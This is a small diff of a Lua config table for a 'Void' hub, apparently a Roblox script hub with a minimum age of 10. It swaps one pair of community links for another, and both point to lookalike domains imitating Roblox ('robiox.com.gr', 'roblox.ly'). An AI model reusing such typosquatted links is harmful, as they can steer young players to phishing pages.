@@ -52,8 +52,8 @@ local HUB = {
     Author     = "Void",
     MinAge     = 10,
     GROUP_ID   = 0,
-    GROUP_URL  = "https://www.robiox.com.gr/communities/1232935860/and-Collect-Rare-Pets",
-    BackupURL  = "https://www.robiox.com.gr/communities/1232935860/and-Collect-Rare-Pets",
+    GROUP_URL  = "https://www.roblox.ly/communities/1232935860/Void-Hub",
+    BackupURL  = "https://www.roblox.ly/communities/1232935860/Void-Hub",
     Discord    = "discord.gg/a4xs2D2hcD",
     SCRIPT_URL = "",
 }
